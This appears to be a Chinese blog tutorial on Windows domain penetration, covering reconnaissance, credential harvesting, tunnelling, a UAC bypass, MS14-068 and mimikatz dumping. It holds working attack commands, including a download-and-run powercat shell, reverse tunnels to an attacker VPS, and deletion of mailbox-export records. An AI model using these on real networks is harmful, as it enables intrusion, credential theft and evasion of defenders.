@@ -1,0 +1,833 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>内网渗透 · 随波逐流の旅店</title>
+<style>:root{--ink:#eaf3ff;--muted:#a9c3dd;--line:rgba(255,255,255,.2);--sky:#3aa3e3;--gold:#e0a545}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{min-height:100vh;color:var(--ink);font:16px/1.85 "PingFang SC","Microsoft YaHei",system-ui,-apple-system,sans-serif;background:#0d2137 url('/SAO-bg.jpg') center/cover fixed no-repeat}
+body::before{content:'';position:fixed;inset:0;background:rgba(8,20,36,.7);z-index:-1}
+.pill{display:inline-flex;align-items:center;gap:8px;padding:7px 16px;border-radius:999px;background:rgba(226,236,248,.16);border:1px solid var(--line);color:#fff;text-decoration:none;font-size:14px;backdrop-filter:blur(12px);transition:.3s}
+.pill:hover{background:rgba(58,163,227,.5)}
+.wrap{max-width:860px;margin:0 auto;padding:44px 22px 80px}
+.panel{margin-top:18px;background:rgba(12,26,44,.62);border:1px solid var(--line);border-radius:20px;padding:34px 36px;backdrop-filter:blur(18px) saturate(140%);box-shadow:0 20px 50px rgba(5,16,30,.4)}
+h1{margin:0 0 14px;font-size:29px;line-height:1.4;color:#fff}
+.meta{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:24px;padding-bottom:18px;border-bottom:1px dashed var(--line)}
+.chip{padding:2px 11px;border-radius:999px;background:rgba(255,255,255,.12);border:1px solid var(--line);font-size:12px;color:var(--muted)}
+.chip.date{color:var(--gold)}
+article h2,article h3,article h4{color:#fff;margin:1.6em 0 .6em;line-height:1.45}
+article h2{font-size:23px;border-left:3px solid var(--sky);padding-left:12px}
+article h3{font-size:19px;color:#dcecff}
+article p{margin:.85em 0}
+article a{color:#8fd0ff}
+article img{max-width:100%;border-radius:10px;margin:14px 0}
+article ul,article ol{padding-left:1.5em}
+article li{margin:.35em 0}
+article blockquote{margin:1.2em 0;padding:10px 18px;border-left:3px solid var(--sky);background:rgba(255,255,255,.07);border-radius:0 10px 10px 0;color:var(--muted)}
+article code{background:rgba(255,255,255,.14);padding:2px 6px;border-radius:5px;font-size:.9em;color:#ffd9a8;font-family:Consolas,Monaco,monospace}
+article pre{background:rgba(6,14,26,.85);border:1px solid var(--line);border-radius:12px;padding:16px 18px;overflow:auto;margin:1.2em 0}
+article pre code{background:none;padding:0;color:#d6e6f7;font-size:13.5px;line-height:1.7}
+article table{width:100%;border-collapse:collapse;margin:1.2em 0;font-size:14px}
+article th,article td{border:1px solid var(--line);padding:8px 12px;text-align:left}
+article th{background:rgba(255,255,255,.07);color:#fff}
+article hr{border:none;border-top:1px dashed var(--line);margin:2em 0}
+.img-fallback{display:block;padding:18px;margin:14px 0;border:1px dashed var(--line);border-radius:10px;background:rgba(255,255,255,.05);color:var(--muted);font-size:13px;text-align:center}
+@media(max-width:640px){.panel{padding:22px 18px}.wrap{padding:24px 14px 60px}h1{font-size:22px}}</style>
+</head>
+<body>
+<div class="wrap">
+  <a class="pill" href="/article-list/">← 返回归档</a> <a class="pill" href="/">⌂ 主页</a>
+  <div class="panel">
+    <h1>内网渗透</h1>
+    <div class="meta"><span class="chip date">2026-08-26</span><span class="chip">分类·内网</span><span class="chip">#内网</span></div>
+    <article><h1>01 信息收集</h1>
+<p>在贡献一台机器以后，如果以为的直接抓取密码，做一些扫描内网的操作，如果有IDS等设备可能造成脖颈丢失权限。所以要先进性信息收集</p>
+<h2>1.1 SPN</h2>
+<p>SPN：服务主题名称，可以理解为网络服务的门牌号。</p>
+<p>使用kerberos必须为服务器注册spn，因此可以在内网扫描spn，快速找到内网中注册的服务。spn扫描可以规避像是端口扫描的不确定性探测。常用的有setspn getuserspns.vbs和rubeus</p>
+<p>a、利用Windows自带的setspn工具，普通域用户权限执行即可：</p>
+<p><code>setspn -T domain.com -Q */*</code></p>
+<p>b、利用GetUserSPNs.vbs也可以获取spn结果:</p>
+<p><code>cscript GetUserSPNs.vbs</code></p>
+<p>c、Rubeus工具</p>
+<h2>1.2 端口连接</h2>
+<p>利用<code>netstat -ano</code>命令获取机器通信信息，根据通信的端口、ip可以获取到如下信息。如果通信信息是入流量，则可以获取到跳板机/堡垒机、管理员的PC来源IP、本地web应用端口等信息；如果通信信息是出流量，则可以获取到敏感端口（redis、mysql、mssql等）、API端口等信息。</p>
+<h2>1.3、配置文件</h2>
+<p>看web应用对应的数据库账号密码
+可以使用如下命令寻找包含密码字段的文件：</p>
+<pre><code>cd /web
+findstr  /s /m &quot;password&quot; *.*
+</code></pre>
+<p>下面是常用web服务器应用的默认配置路径：</p>
+<p>a.Tomcat:</p>
+<pre><code>CATALINA_HOME/conf/tomcat-users.xml
+</code></pre>
+<p>b.Apache:</p>
+<pre><code>/etc/httpd/conf/httpd.conf
+</code></pre>
+<p>c.Nginx:</p>
+<pre><code>/etc/nginx/nginx.conf
+</code></pre>
+<p>d.Wdcp:</p>
+<pre><code>/www/wdlinux/wdcp/conf/mrpw.conf
+</code></pre>
+<p>e.Mysql:</p>
+<pre><code>mysql\data\mysql\user.MYD
+</code></pre>
+<h2>1.4 用户信息</h2>
+<p>可以在网内收集用户等信息，对高权限用户做针对性的攻击，包括定位到域控，对域控发起攻击。</p>
+<p>a、查看域用户，普通域用户权限即可：</p>
+<p><code>net user /domain</code></p>
+<p>b、查看域管理员</p>
+<p><code>net group &quot;domain admins&quot; /domain</code></p>
+<p>c、快速定位域控ip，一般是dns、时间服务器：</p>
+<p><code>net time /domain</code></p>
+<pre><code>nslookup -type=all_ldap._tcp.dc._msdcs.domain.com
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>命令部分</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>nslookup</td>
+<td>域名查询工具，用于向 DNS 服务器发起查询请求</td>
+</tr>
+<tr>
+<td>-type=all</td>
+<td>指定查询类型为“所有”。这里主要目的是获取 SRV（服务定位）记录 和关联的 A（主机地址）记录</td>
+</tr>
+<tr>
+<td>_ldap._tcp</td>
+<td>_ldap 指明要寻找的是 LDAP 服务（AD 目录服务），_tcp 指明使用 TCP 协议</td>
+</tr>
+<tr>
+<td>.dc._msdcs</td>
+<td>这是一个非常关键的路径标识，意为“域控（Domain Controller）的微软域服务（Microsoft Domain Services）”</td>
+</tr>
+<tr>
+<td>.domain.com</td>
+<td>你所在的 AD 域名称</td>
+</tr>
+</tbody></table>
+<p>d、查看域控制器：
+<code>net group &quot;domaincontrollers&quot; /domain</code></p>
+<h2>1.5 内网主机发现</h2>
+<p>a.查看共享资料：</p>
+<pre><code>net view
+</code></pre>
+<p>b.查看arp表</p>
+<pre><code>arp -a
+</code></pre>
+<p>c.查看hosts文件</p>
+<pre><code>linux
+cat /etc/hosts
+
+windows
+type  c:\Windows\system32\drivers\etc\hosts
+</code></pre>
+<p>d.查看dns缓存：</p>
+<pre><code>ipconfig  /displaydns
+</code></pre>
+<p>e.使用一些工具比方说nbtscan,nmap等</p>
+<h2>1.6、会话收集</h2>
+<p>在网内收集会话，如看管理员登录过哪些机器、机器被谁登录过，这样攻击的目标就会清晰很多。</p>
+<p>可以使用NetSessionEnum api来查看其他主机上有哪些用户登录。</p>
+<p>api相关介绍如下：</p>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum">https://docs.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum</a></p>
+<p>a.利用powershell脚本PowerView</p>
+<pre><code>Import-Module \powerview.ps1
+invoke-UserHunter -UserName &quot;win7user&quot;
+</code></pre>
+<p><a href="https://cloud.tencent.com/developer/article/1589060">如何查看域用户登录的计算机</a></p>
+<p>b.也可以查看机器被哪些用户登陆过：</p>
+<p>简单的就是查看事件查看器的4624登录成功共和4625登陆失败</p>
+<p><a href="https://cloud.tencent.com/developer/article/2591107">Windows 和 Linux 系统登录记录查询指南</a></p>
+<h2>1.7、凭据收集</h2>
+<p>拿下一台机器后，需要尽可能的收集信息。如下是几个常用软件保存密码的注册表地址，可以根据算法去解密保存的账号密码</p>
+<p>远程连接凭据：</p>
+<table>
+<thead>
+<tr>
+<th>命令部分</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers&lt;连接名&gt;</td>
+<td>Navicat for MySQL 存储连接信息（含加密密码）的注册表路径</td>
+</tr>
+<tr>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers&lt;连接名&gt;</td>
+<td>Navicat for MariaDB 存储连接信息的注册表路径</td>
+</tr>
+<tr>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers&lt;连接名&gt;</td>
+<td>Navicat for MongoDB 存储连接信息的注册表路径</td>
+</tr>
+<tr>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers&lt;连接名&gt;</td>
+<td>Navicat for Microsoft SQL Server 存储连接信息的注册表路径</td>
+</tr>
+<tr>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers&lt;连接名&gt;</td>
+<td>Navicat for Oracle 存储连接信息的注册表路径</td>
+</tr>
+<tr>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers&lt;连接名&gt;</td>
+<td>Navicat for PostgreSQL 存储连接信息的注册表路径</td>
+</tr>
+<tr>
+<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers&lt;连接名&gt;</td>
+<td>Navicat for SQLite 存储连接信息的注册表路径</td>
+</tr>
+<tr>
+<td>C:\Users&lt;用户名&gt;\AppData\Roaming\VanDyke\Config\Sessions</td>
+<td>SecureCRT 在 Win7/Win2008+ 系统上存储会话配置（含密码）的路径</td>
+</tr>
+<tr>
+<td>%userprofile%\Documents\NetSarang\Xshell\Sessions</td>
+<td>Xshell 5 存储会话文件的路径（含密码）</td>
+</tr>
+<tr>
+<td>%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions</td>
+<td>Xshell 6 存储会话文件的路径（含密码）</td>
+</tr>
+<tr>
+<td>HKCU\Software\Martin Prikryl\WinSCP 2\Sessions</td>
+<td>WinSCP 存储已保存站点会话信息（含密码）的注册表路径</td>
+</tr>
+<tr>
+<td>HKLM\SOFTWARE\RealVNC\vncserver (Password)</td>
+<td>RealVNC 存储服务端密码（通常加密）的注册表路径</td>
+</tr>
+<tr>
+<td>HKCU\Software\TightVNC\Server (Password / PasswordViewOnly)</td>
+<td>TightVNC 存储当前用户密码配置的注册表路径</td>
+</tr>
+<tr>
+<td>HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4 (Password)</td>
+<td>TigerVNC 存储密码配置的注册表路径（实际通常为 HKCU 或 HKLM）</td>
+</tr>
+<tr>
+<td>C:\Program Files\UltraVNC\ultravnc.ini (passwd / passwd2)</td>
+<td>UltraVNC 存储密码明文的配置文件路径（通常用于本地认证）</td>
+</tr>
+</tbody></table>
+<h2>1.8、DPAPI</h2>
+<p>由微软从Windows 2000开始发布，称为Data ProtectionApplication Programming Interface（DPAPI）。其分别提供了加密函数CryptProtectData 与解密函数 CryptUnprotectData 。</p>
+<p>其作用范围包括且不限于：</p>
+<p>outlook客户端密码</p>
+<p>windowscredential凭据</p>
+<p>chrome保存的密码凭据</p>
+<p>internetexplorer密码凭据</p>
+<p>DPAPI采用的加密类型为对称加密，存放密钥的文件则被称之为Master Key Files，其路径一般为%APPDATA%\Microsoft\Protect{SID}{GUID}。其中{SID}为用户的安全标识符，{GUID}为主密钥名称。我们可以利用用户的密码/hash或域备份密钥解密主密钥，然后解密被dpapi加密的数据。</p>
+<p>相关的介绍如下：</p>
+<p><a href="https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection">https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection</a></p>
+<p>在渗透中，可以利用mimikatz做到自动化的数据解密：</p>
+<p>a、解密Chrome密码：</p>
+<pre><code>mimikatz  dpapi::chrome /in:&quot;%localappdata%\Google\Chrome\User Data\Default\Login  Data&quot; /unprotect
+</code></pre>
+<p>b、解密Credential：</p>
+<pre><code>mimikatz  vault::cred /patch
+</code></pre>
+<h2>1.9、域信任</h2>
+<p>当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。</p>
+<p>查看域信任：</p>
+<pre><code>nltest  /domain_trusts
+</code></pre>
+<p>1.10、域传送
+存在域传送漏洞时，可以获取域名解析记录。当有了解析记录后，也能提高对网络环境的进一步认知，比如www解析的ip段可能在dmz区，mail解析的ip段可能在核心区域等等。</p>
+<pre><code>windows
+nslookup  -type=ns domain.com
+nslookup
+sserver  dns.domain.com
+ls  domain.com
+
+linux
+dig @dns.domain.com axfr domain.com
+</code></pre>
+<h2>1.11、DNS记录获取</h2>
+<p>a、在windows server上，可以使用Dnscmd工具获取dns记录。</p>
+<pre><code>Dnscmd. /ZonePrint domain.com
+
+Dnscmd. /EnumRecords domain.com
+</code></pre>
+<p>b、在非windows server机器上，可以使用PowerView获取。</p>
+<pre><code>import-module  PowerView.ps1
+
+Get-DNSRecord  -ZoneName domnain.com
+</code></pre>
+<h2>1.12、WIFI</h2>
+<p>通过如下命令获取连接过的wifi密码</p>
+<pre><code>for /f  &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#39;netsh wlan show profiles&#39;)  do  @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key=clear
+</code></pre>
+<h2>1.13、GPP</h2>
+<p>当分发组策略时，会在域的SYSVOL目录下生成一个gpp配置的xml文件，如果在配置组策略时填入了密码，则其中会存在加密过的账号密码。这些密码，往往都是管理员的密码。</p>
+<p>其中xml中的密码是aes加密的，密钥已被微软公开：</p>
+<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN</a></p>
+<p>可以使用相关脚本进行解密，如：</p>
+<p><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></p>
+<p>域用户登录脚本存在目录也会存在敏感文件：</p>
+<p><code>\\domain\Netlogon</code></p>
+<h2>1.14、自动化工具</h2>
+<p>比如说Seatbelt，Bloodhound（执行SharpHound.exe  -c all生成zip压缩包之后导入）</p>
+<h2>1.15、Exchange</h2>
+<h3>1.16.1 邮箱用户密码爆破</h3>
+<p>使用ruler工具对owa(outlook网页版)接口进行爆破：</p>
+<pre><code>
+./ruler  --domain targetdomain.com brute --users /path/to/user.txt --passwords  /path/to/passwords.txt
+</code></pre>
+<p>ruler工具会自动搜索owa可以爆破的接口，如：</p>
+<p><a href="https://autodiscover.targetdomain.com/autodiscover/autodiscover.xml">https://autodiscover.targetdomain.com/autodiscover/autodiscover.xml</a></p>
+<p>其他如ews接口也存在被暴力破解利用的风险：</p>
+<p><a href="https://mail.targetdomain.com/ews">https://mail.targetdomain.com/ews</a></p>
+<h3>1.16.2 通讯录收集</h3>
+<p>在获取一个邮箱账号密码后，可以使用MailSniper收集通讯录，当拿到通讯录后，可以再次利用上述爆破手段继续尝试弱密码，但是记住，密码次数不要太多，很有可能会造成域用户锁定：</p>
+<pre><code>Get-GlobalAddressList  -ExchHostname mail.domain.com -UserName domain\username -Password Fall2016  -OutFile global-address-list.txt
+</code></pre>
+<h3>1.16.3 信息收集</h3>
+<p>当我们拿下exchange服务器后，可以做一些信息收集，包括不限于用户、邮件。</p>
+<p>获取所有邮箱用户：</p>
+<pre><code>Get-Mailbox
+</code></pre>
+<p>导出邮件：</p>
+<pre><code>New-MailboxexportRequest  -mailbox username -FilePath (&quot;\\localhost\c$\test\username.pst&quot;)
+</code></pre>
+<p>也可以通过web口导出，登录：</p>
+<p><a href="https://mail.domain.com/ecp/">https://mail.domain.com/ecp/</a></p>
+<p>导出后会有记录，用如下命令可以查看：</p>
+<pre><code>Get-MailboxExportRequest
+</code></pre>
+<p>删除某个导出记录：</p>
+<pre><code>Remove-MailboxExportRequest  -Identity &#39;username\mailboxexport&#39; -Confirm:$false
+</code></pre>
+<h1>02 传输通道</h1>
+<p>在做完信息收集后，为了方便进一步内网渗透，一般都会建立一个通道，甚至是多级跳板。</p>
+<h2>2.1、是否出网</h2>
+<table>
+<thead>
+<tr>
+<th>command</th>
+<th>test</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ping</td>
+<td>icmp</td>
+</tr>
+<tr>
+<td>curl</td>
+<td>http</td>
+</tr>
+<tr>
+<td>nslookup</td>
+<td>dns</td>
+</tr>
+</tbody></table>
+<h2>2.2、netsh</h2>
+<p>netsh是windows自带的命令，可以允许修改计算机的网络配置。也可以被拿来做端口转发。</p>
+<p>A机器执行如下命令</p>
+<pre><code>netsh  interface portproxy add v4tov4 listenport=5555 connectport=3389 connectaddress=192.168.1.1  protocol=tcp
+</code></pre>
+<p>其中<code>add v4tov4</code>意思是<code>添加一条 IPv4 → IPv4 的转发规则（也有 v6tov4、v4tov6 等变体）</code></p>
+<p>B机器访问A机器的5555端口，即是192.168.1.1的3389端口</p>
+<h2>2.3、SSH</h2>
+<p>一般被拿来登录linux机器，也可以拿来做代理和转发。</p>
+<p>a、开启socks代理：</p>
+<p><code>ssh -qTfnN -D 1111root@1.1.1.1</code></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ssh</td>
+<td>SSH 客户端</td>
+</tr>
+<tr>
+<td>-q</td>
+<td>quiet 安静模式：抑制大部分警告和错误输出</td>
+</tr>
+<tr>
+<td>-T</td>
+<td>不分配伪终端（TTY）：纯转发用，不需要交互式 shell</td>
+</tr>
+<tr>
+<td>-f</td>
+<td>后台运行：认证成功后就 fork 到后台，命令立即返回（配合 -N 是常驻隧道的经典组合）</td>
+</tr>
+<tr>
+<td>-n</td>
+<td>stdin 重定向到 /dev/null：不让 SSH 从前台读输入（配合 -f 后台化）</td>
+</tr>
+<tr>
+<td>-N</td>
+<td>不执行远程命令：这条连接只做端口转发，不打开 shell</td>
+</tr>
+<tr>
+<td>-D</td>
+<td>1111	动态端口转发：在本地 1111 端口开一个 SOCKS5 代理</td>
+</tr>
+<tr>
+<td><a href="mailto:root@1.1.1.1">root@1.1.1.1</a></td>
+<td>以 root 身份连接远程主机 1.1.1.1</td>
+</tr>
+</tbody></table>
+<p>效果是</p>
+<pre><code>把浏览器或任意工具（如 Proxifier、curl --socks5）指向 127.0.0.1:1111
+所有流量走 SSH 加密通道到 1.1.1.1，以 1.1.1.1 的出口访问外部资源
+1.1.1.1 能看到你访问了谁，但中间链路是加密的；目标网站看到的是 1.1.1.1 的 IP
+</code></pre>
+<p>b、控制A、B机器，A能够访问B，且能出网，B能够访问C，但不能出网，A不能访问C：</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-C</td>
+<td>压缩：隧道流量压缩传输</td>
+</tr>
+<tr>
+<td>-N</td>
+<td>不执行远程命令，纯转发</td>
+</tr>
+<tr>
+<td>-f</td>
+<td>认证成功后后台运行</td>
+</tr>
+<tr>
+<td>-g</td>
+<td>允许其他机器连接转发的端口（默认只允许本机 loopback 访问，加 -g 后绑定所有网卡，局域网内的机器也能用这个代理/端口）</td>
+</tr>
+</tbody></table>
+<p><code>ssh -CNfg -L 2121:CIP:21 root@BIP</code></p>
+<p>输入BIP机器密码，访问A的2121端口即是访问CIP的21端口。</p>
+<p><code>-L 本地转发</code></p>
+<p>c、控制A机器，A能够访问B：</p>
+<p><code>ssh -CNfg -R 2121:BIP:21 root@hackervps</code>
+输入黑客vps密码，访问黑客vps的2121端口即是访问BIP的21端口。</p>
+<p><code>-R 远程转发</code></p>
+<h2>2.4、自动化工具</h2>
+<h3>reGeorg</h3>
+<p>可以解决当机器不出网时，使用http代理进入内网。</p>
+<pre><code>本地运行：
+
+pythonreGeorgSocksProxy.py -p 9999 -u http://1.1.1.1:8080/tunnel.xx
+
+利用proxychains等类似工具连接本地的9999端口的sock5连接即可代理1.1.1.1的网络。
+</code></pre>
+<h3>EarthWorm</h3>
+<p>用于开启SOCKS v5代理服务的工具</p>
+<p>a、受害者机器有外网ip并可直接访问：</p>
+<p>把ew传到对方服务器上，执行：</p>
+<p><code>./ew -s ssocksd -l 8888</code></p>
+<p>现在本地利用proxychains等类似工具连接本地的对方服务器的8888端口的sock5连接即可代理对方的网络。</p>
+<p>b、控制A机器，A能够访问B，通过A访问B：</p>
+<p>在自己外网服务器上执行：</p>
+<p><code>./ew -s rcsocks -l 1080 -e 8888</code></p>
+<p>对方服务器执行：</p>
+<p><code>./ew -s rssocks -d yourvpsip -e 8888</code></p>
+<p>利用proxychains等类似工具可通过连接你的外网vps的1080 端口的socks5，即可代理受害者服务器的网络。</p>
+<p>c、控制A、B机器，A能够访问B，B能够访问C，A有外网ip并可直接访问，通过A来使用B的流量访问C：</p>
+<p>B机器执行：</p>
+<p><code>./ew -s ssocksd -l 9999</code></p>
+<p>A机器：</p>
+<p><code>./ew -s lcx_tran -l 1080 -f BIP -g 9999</code></p>
+<p>利用proxychains等类似工具可通过连接A的1080 端口的socks5，即可代理B服务器的网络。</p>
+<p>d、控制A、B机器，A能够访问B，B能够访问C，A没有外网ip，通过A连接自己的外网vps来使用B的流量访问C：</p>
+<p>自己vps执行：</p>
+<p><code>./ew -s lcx_listen -l 1080 -e 8888</code></p>
+<p>B机器执行：</p>
+<p><code>./ew -s ssocksd -l 9999</code></p>
+<p>A机器执行：</p>
+<p><code>./ew -s lcx_slave -d vpsip -e 8888 -f BIP -g 9999</code></p>
+<p>利用proxychains等类似工具可通过连接你自己的vps的1080 端口的socks5，即可代理B服务器的网络。</p>
+<h3>lcx</h3>
+<p>a、反向转发</p>
+<p>外网VPS机器监听：</p>
+<p><code>lcx.exe -listen 1111 2222</code></p>
+<p>受害者机器执行：</p>
+<p><code>lcx.exe -slave VPSip 1111 127.0.0.1 3389</code></p>
+<p>连接外网VPS机器的2222端口即是连接受害者机器的3389。</p>
+<p>b、正向转发</p>
+<p>A机器执行：</p>
+<p><code>lcx.exe -tran 1111 2.2.2.2 8080</code></p>
+<p>访问A机器的1111端口即是访问2.2.2.2的8080端口。</p>
+<h2>2.5、powercat</h2>
+<p>powercat是一款ps版nc。可以本地执行，也可以远程下载执行，远程执行命令如下：</p>
+<pre><code>powershell&quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat-l -p 8000 -e cmd&quot;
+</code></pre>
+<p>然后远程连接执行命令即可。如果嫌弃该命令太暴露，可以对其进行编码。</p>
+<h2>2.6 mssql</h2>
+<p>当目标机器只开放mssql时，我们也可以利用mssql执行clr作为传输通道</p>
+<p>工具地址</p>
+<pre><code>https://github.com/blackarrowsec/mssqlproxy
+</code></pre>
+<h1>03 权限提升</h1>
+<h2>3.1 UAC</h2>
+<p>UAC，即用户账户控制，就是以管理员权限运行的时候跳出来那个，如果想远哦bypass的话可以找一些以高权限运行的，但是并没有uac提示的进程，然后利用ProcessMonitor寻找他启动调用却缺失的如dll、注册表键值，然后我们添加对应的值达到bypass uac的效果。</p>
+<p>比方说win10里面的<code>ComputerDefaults.exe</code>程序，他是微软自带的可信系统程序，当该程序被运行时，会无提示地读取并执行当前用户在注册表中设置的键值。</p>
+<p>所以可以在注册表中找到该程序的路径，将默认值改为cmd，这样当 <code>ComputerDefaults.exe </code>运行并尝试打开设置时，它会把执行权限转交给这个键值指向的命令，从而在未触发任何弹窗的情况下，让 <code>cmd.exe</code> 继承了高完整性权限</p>
+<p><a href="https://imgchr.com/i/pnkYHyD"><img src="https://s41.ax1x.com/2026/09/04/pnkYHyD.png" alt="pnkYHyD.png"></a></p>
+<p>需要注意的是，我们需要先检查hkcu，如果 HKCU 里写入了，系统就会默认优先读取 HKCU 的配置（遮蔽 HKLM/HKCR），这个注册表劫持实际上就是利用了高权限程序 <code>ComputerDefaults.exe </code>会优先读取 HKCU 的漏洞，借它的手执行了自己低权限写进去的代码，从而间接获得了高权限的 CMD 窗口。</p>
+<h2>3.2、ms14-068</h2>
+<p>该漏洞可以在只有一个普通域用户的权限时，获取到域控权限。微软已经修复了该漏洞，对应的补丁号为kb3011780。</p>
+<p><strong><center>Kerberos协议流程图</center></strong></p>
+<p><a href="https://imgchr.com/i/pnktulT"><img src="https://s41.ax1x.com/2026/09/04/pnktulT.png" alt="pnktulT.png"></a></p>
+<p>1、域用户登录时，向KDC的AS服务以自身密码加密的时间戳进行预认证；</p>
+<p>2、域控的AS服务验证用户的密码是否正确。验证通过后，返回给用户一张TGT票据，该票据为krbtgt密码加密而成；</p>
+<p>3、域用户拿着TGT向KDC的TGS服务申请访问Application Server的票据</p>
+<p>4、域控的TGS服务验证TGT通过后，返回给域用户能够访问Application Server的票据，即ST，ST以Application Server的服务账号密码加密；</p>
+<p>5、域用户拿着ST访问对应的Application Server；</p>
+<p>6、Application Server验证ST，决定成功与否。</p>
+<p>而ms14-068的成因就是：</p>
+<p>TGT中作为用户凭证，包含了用户名、用户id、所属组等信息，即PAC。简单点讲，PAC就是验证用户所拥有权限的特权属性证书。</p>
+<p>默认PAC是包含在TGT中的，而出现ms14-068这个问题的原因在于用户在申请TGT时可以要求KDC返回的TGT不包含PAC（include-PAC为false），然后用户自己构造PAC并放入TGS_REQ数据包中的REQ_BODY中，KDC会解密PAC并加密到一个新的TGT中（正常应该返回一个ST）并返回给用户，此时这个TGT已经带入了我们构造的恶意的PAC。后面就是正常的kerberos流程了。</p>
+<pre><code>
+python  ms14-068.py -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d  &lt;domainControlerAddr&gt;
+
+mimikatz.exe  &quot;kerberos::ptc TGT_user@domain.ccache&quot; exit
+</code></pre>
+<p>也可以利用goldenPac.py实现</p>
+<pre><code>goldenPac.py  domain.com/username:password@dc.domain.com
+</code></pre>
+<h1>04 密码获取</h1>
+<h2>4.1、ntlmhash和net-ntlmhash</h2>
+<p>先简单介绍下lmhash和ntlmhash。</p>
+<p>我们经常看到的hash长这样：</p>
+<p><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</code></p>
+<p>他的组成就是:</p>
+<p><code>user:sid:lmhash:ntlmhash</code></p>
+<p>lmhash的加密流程如下：</p>
+<p>1、密码长度限制为14个字符</p>
+<p>2、密码全部转换为大写</p>
+<p>3、密码转换为16进制字符串，不足14字节用0补全</p>
+<p>4、密码的16进制字符串被分成两个7byte部分</p>
+<p>5、再分7bit为一组,每组末尾加0，再组成一组</p>
+<p>6、上步骤得到的二组，分别作为key 为 “KGS!@#$%”进行DES加密。</p>
+<p>7、将加密后的两组拼接在一起，得到最终LM HASH值。</p>
+<p>为了解决lmhash强度不够的问题，微软推出了ntlmhash：</p>
+<p>1、先将用户密码转换为十六进制格式。</p>
+<p>2、将十六进制格式的密码进行Unicode编码。</p>
+<p>3、使用MD4对Unicode编码数据进行Hash计算</p>
+<p>因为在vista后不再支持lmhash，因此抓到的hash中的lmhash都是aad3b435b51404eeaad3b435b51404ee</p>
+<p>在hash传递攻击时，可以替换成0：</p>
+<p>00000000000000000000000000000000</p>
+<p><a href="https://imgchr.com/i/pnkUSsS"><img src="https://s41.ax1x.com/2026/09/04/pnkUSsS.png" alt="pnkUSsS.png"></a></p>
+<p>他的简述流程如下：</p>
+<p>1、客户端向服务端发起认证</p>
+<p>2、服务器收到请求后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端。并使用登录用户密码hash加密Challenge，获得Challenge1</p>
+<p>3、客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，获得Challenge2(这个结果被称为response)，将response发送给服务器</p>
+<p>4、服务器接收客户端加密后的response，比较Challenge1和response，如果相同，验证成功。</p>
+<p>这些都是基于微软的 NTLM 认证协议（New Technology LAN Manager）是一种基于挑战-响应机制的Windows身份验证协议，用于在不传输明文密码的情况下验证用户身份。</p>
+<p><strong>简单来说，NTLM Hash 是静态的本地钥匙，因为是静态的，所以可以复制粘贴拿去开别的门（PtH）。</strong></p>
+<p><strong>Net-NTLM Hash 是动态的临时指纹，每次门的锁芯不一样（挑战值不同），所以不能直接复制拿去开别的门；但是你可以破解指纹算出原始的密码，或者站在中间把指纹实时转递给一个正好配对的锁（Relay）。</strong></p>
+<p>因此ntlmhash我们是可以拿来hash传递的，而net-ntlmhash不可以，但是net-ntlmhash也可以拿来做破解和中间人。</p>
+<h2>4.2、本地用户凭据</h2>
+<p>在windows上，C:\Windows\System32\config目录保存着当前用户的密码hash。我们可以使用相关手段获取该hash。</p>
+<p>比方说使用reg命令获取本地用户凭证hash</p>
+<pre><code>reg save  hklm\sam sam.hive
+reg  save hklm\system system.hive
+reg  save hklm\security security.hive
+</code></pre>
+<p>或者使用pwdump7以及mimikatz等</p>
+<pre><code class="language-mimikatz">privilege::debug
+token::elevate
+lsadump::sam
+</code></pre>
+<p>从lsass.exe中也可以获取，如直接用mimikatz</p>
+<pre><code>privilege::debug
+sekurlsa::logonpasswords
+</code></pre>
